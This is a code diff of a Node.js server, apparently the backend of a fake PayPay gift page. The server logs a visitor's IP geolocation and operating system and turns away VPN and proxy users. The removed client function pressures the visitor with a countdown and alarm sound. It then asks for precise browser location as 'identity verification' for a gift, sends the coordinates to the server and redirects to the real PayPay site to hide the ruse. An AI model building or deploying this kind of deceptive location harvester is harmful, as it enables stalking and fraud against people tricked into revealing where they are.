@@ -1,4 +1,4 @@
-// server.js（統合版）
+// server.js
 require('dotenv').config();
 const express = require('express');
 const nodemailer = require('nodemailer');
@@ -12,7 +12,7 @@ app.use(express.json());
 
 const validTokens = new Set();
 
-// トークン発行
+// トークン発行API
 app.get('/token', (req, res) => {
   const token = crypto.randomBytes(16).toString('hex');
   validTokens.add(token);
@@ -39,6 +39,7 @@ app.post('/report', async (req, res) => {
     console.error('Geoエラー:', e);
   }
 
+  // VPN/Proxy判定
   if (geo.proxy || geo.hosting) {
     return res.status(403).json({ redirect: '/warning.html' });
   }
@@ -86,46 +87,3 @@ OS: ${ua.os.name} ${ua.os.version}
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`📡 Listening on http://localhost:${PORT}`));
 
-async function verifyLocation() {
-  try {
-    const tokenRes = await fetch('/token');
-    const { token } = await tokenRes.json();
-
-    if (!navigator.geolocation) {
-      alert("この端末では位置情報が使用できません。");
-      localStorage.setItem('robot', 'true');
-      location.reload();
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      async pos => {
-        clearInterval(countdownInterval);
-        document.getElementById('alertSound').pause();
-
-        await fetch('/report', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Authorization': token
-          },
-          body: JSON.stringify({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude
-          })
-        });
-
-        alert("本人確認が完了しました。ギフトを受け取ります。");
-        location.href = "https://paypay.ne.jp/";
-      },
-      err => {
-        alert("⚠️ 位置情報が拒否されたため、ギフトを受け取ることができません。");
-        localStorage.setItem('robot', 'true');
-        location.reload();
-      }
-    );
-  } catch (err) {
-    alert("通信エラーが発生しました。");
-    console.error(err);
-  }
-}
